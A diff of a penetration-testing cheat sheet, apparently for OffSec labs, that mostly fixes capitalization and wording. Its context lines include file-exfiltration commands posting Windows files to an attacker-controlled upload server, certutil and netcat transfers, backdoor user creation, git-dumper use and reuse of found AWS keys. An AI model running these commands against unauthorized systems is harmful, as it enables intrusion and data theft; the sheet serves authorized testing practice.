@@ -29,7 +29,7 @@ xfreerdp3 /u:user /p:pass /v:<ip> /drive:<name>,<path>
 ```shell
 # simple python server
 python -m http.server <port>
-# simple python upload-enabled server (optional basic auth)
+# simple Python upload-enabled server (optional basic auth)
 pip install uploadserver
 python -m uploadserver --basic-auth user:pass <port>
 
@@ -44,7 +44,7 @@ sudo systemctl start apache2
 
 ```shell
 impacket-smbserver -smb2support share $(pwd) 
-# win 10+ Compatibility (With Authentication)
+# Windows 10+ compatibility (with authentication)
 impacket-smbserver -smb2support -user test -password test share $(pwd) 
 ```
 
@@ -66,15 +66,15 @@ nc <ip> <port> < <file_path>
     # PowerShell
     iwr -uri <uri> -outfile <filename>
 
-    # cmd
+    # CMD
     certutil -urlcache -split -f <uri> <dest>
 
-    # copy from smb share
+    # copy from SMB share
     copy \\<ip>\share\<file>
 
-    # mount share before copy. (win 10+ w/o Authentication)
+    # mount share before copy (Win 10+ without authentication)
     net use Z: \\<ip>\share
-    # mount share before copy. (win 10+ w/ Authentication)
+    # mount share before copy (Win 10+ with authentication)
     net use Z: \\<ip>\share /u:user 'pass'
     ```
 
@@ -89,16 +89,16 @@ nc <ip> <port> < <file_path>
 ### Exfiltrating files from Windows
 
 ```shell
-# send file to python upload-enabled server
+# send file to Python upload-enabled server
 Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\path\to\file
 curl -F "file=@C:\path\to\file.txt" http://<linux-ip>:<port> -u user:pass
 
-# copy to smb share
+# copy to SMB share
 copy C:\path\to\file \\<ip>\share
 
-# mount share before copy. (win 10+ w/o Authentication)
+# mount share before copy (Win 10+ without authentication)
 net use Z: \\<ip>\share
-# mount share before copy. (win 10+ w/ Authentication)
+# mount share before copy (Win 10+ with authentication)
 net use Z: \\<ip>\share /u:user 'pass'
 ```
 
@@ -125,7 +125,7 @@ upx <bin_path>
 # find printable strings in a file
 strings
 
-# display dynamic library calls of a process
+# display dynamic library calls of a process, perfect for binary hijacking
 ltrace
 ```
 
@@ -148,7 +148,7 @@ ltrace
     # system info
     systeminfo
     Get-ComputerInfo
-    # os details
+    # OS details
     wmic os get version
     Get-WmiObject Win32_OperatingSystem
     # show drives
@@ -181,7 +181,7 @@ ltrace
     # check user sudo permissions
     sudo -l
 
-    # create/delete/change pass users
+    # create/delete/change user password
     useradd -m username
     useradd -u <UID> -g <group> <uname>
     userdel -r username
@@ -190,7 +190,7 @@ ltrace
     usermod -aG sudo username
 
     # show who is currently logged in
-    who|w
+    who | w
     # show last logins
     last
     ```
@@ -205,7 +205,7 @@ ltrace
     Get-LocalUser
     # show user details
     net user username
-    # create/delete/change pass user
+    # create/delete/change user password
     net user username password /add
     New-LocalUser -Name "username" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
     net user username /delete
@@ -262,7 +262,7 @@ ltrace
     where /R <path> <program.exe>
     Get-ChildItem -Path C:\ -Filter <program.exe> -Recurse -ErrorAction SilentlyContinue
 
-    # copy dirs recursively
+    # copy directories recursively
     xcopy /s /e source destination /Y 2>nul
     Copy-Item -Recurse source destination -Force
     # move
@@ -283,7 +283,7 @@ ltrace
     # force
     kill -9 <pid>
     killall <process_name>
-    # find process pid by name
+    # find process PID by name
     pgrep process_name
     ```
 
@@ -297,11 +297,11 @@ ltrace
 
     # force kill process by name
     taskkill /F /IM <program.exe>
-    # by id
+    # by ID
     taskkill /PID <pid_number> /F
 
     Get-Process
-    # force kill process by id
+    # force kill process by ID
     Stop-Process -Id PID -Force
     Stop-Process -Name "process" -Force
     ```
@@ -347,7 +347,7 @@ ltrace
     # dns lookup
     nslookup domain
     Resolve-DnsName domain
-    # trace path
+    # trace route
     tracert host
     # test connectivity
     Test-NetConnection host -Port port
@@ -387,7 +387,7 @@ ltrace
     Stop-Service service_name
     Restart-Service service_name
 
-    # set service to start auto
+    # set service to start automatically
     sc config service_name start=auto
     Set-Service service_name -StartupType Automatic
     Set-Service service_name -StartupType Disabled
@@ -426,20 +426,20 @@ ltrace
 
 === "Linux"
 
-    - Append `2>/dev/null` to suppress error messages only
-    - Append `&>/dev/null` to suppress both standard output and errors
+    - Append `2>/dev/null` to suppress error messages only.
+    - Append `&>/dev/null` to suppress both standard output and errors.
   
 === "Windows"
 
-    - **CMD**: Append `2>nul` to suppress error messages
-    - **PowerShell**: Add `-ErrorAction SilentlyContinue` parameter to cmdlets
+    - **CMD**: Append `2>nul` to suppress error messages.
+    - **PowerShell**: Add the `-ErrorAction SilentlyContinue` parameter to cmdlets.
 
 ## Git
 
 > [git-dumper](https://github.com/arthaud/git-dumper)
 
 ```shell
-# dump git repo from url
+# dump git repo from URL
 git-dumper <url>/.git ./website
 
 # show commits on a branch
@@ -453,7 +453,7 @@ git show <commit>
 !!! warning ""
     Out of Scope
 
-Setup credentials if you find access keys
+Set up credentials if you find access keys.
 
 ```shell
 aws configure
@@ -478,7 +478,7 @@ aws s3 cp <file> s3://<bucket>/ --endpoint-url <url> --no-sign-request
 ## VPN
 
 !!! danger
-    Offsec machines and VPN are sometimes unstable.
+    OffSec machines and VPN are sometimes unstable.
 
 Reduce MTU if reverse shells are not connecting back.
 
